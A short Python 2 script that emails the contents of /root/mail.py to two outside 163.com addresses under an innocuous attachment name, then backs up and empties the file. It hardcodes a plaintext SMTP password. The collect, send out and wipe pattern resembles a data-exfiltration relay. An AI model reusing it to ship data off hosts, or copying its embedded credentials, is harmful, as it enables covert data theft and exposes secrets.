#encoding=utf-8
import shutil
import smtplib
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from time import strftime, localtime 
from datetime import timedelta, date
openfile=open('/root/mail.py')
judgement=openfile.read()
openfile.close()
if judgement != '':
    year = strftime("%Y",localtime())
    mon  = strftime("%m",localtime())
    day  = strftime("%d",localtime())
    hour = strftime("%H",localtime())
    min  = strftime("%M",localtime())
    sec  = strftime("%S",localtime())
    nowtime=year+mon+day+hour+min+sec

    sourcefile="/root/mail.py"
    sourcepath="/root/"
    mail_host = 'smtp.163.com'
    mail_user = 'wooyun_daishu@163.com'
    mail_pwd = '(jes$aM909@jZgtdP1'
    mail_to = ['recve@163.com','recve2@163.com']
 
 
    msg = MIMEMultipart()
#---------------------------------------------------------------------------- 
    att = MIMEText(open('/root/mail.py','rb').read(),'base64','gb2312')
    #att = MIMEText(judgement,_charset='utf-8')
    att["Content-Type"] = 'application/octet-stream'
    att["Content-Disposition"] = 'attachment;filename="hello.txt"'
    msg.attach(att)
#----------------------------------------------------------------------------
#message = 'content part'
#body = MIMEText(judgement)
#msg.attach(body)
#    msg['To'] = mail_to
    msg['To']=','.join(mail_to)
#    print msg,'----',msg['To']
    msg['from'] = mail_user
    msg['subject'] = '日志文件'
 
    try:
        s = smtplib.SMTP()
        s.connect(mail_host)
        s.login(mail_user,mail_pwd)
 
        s.sendmail(mail_user,mail_to,msg.as_string())
        s.close()
    #os.system('cp /root/mail.py /root/+"%d" %(nowtime)+".txt"')
        desfile=sourcepath+nowtime+'.txt'
        shutil.copyfile(sourcefile,desfile)
        print "backup ok"
        emptyfile=open(sourcefile,'w')
        emptyfile.close()
        print "empty success"
        print 'mail send success'
    except Exception,e:
        print e
else:
    exit()
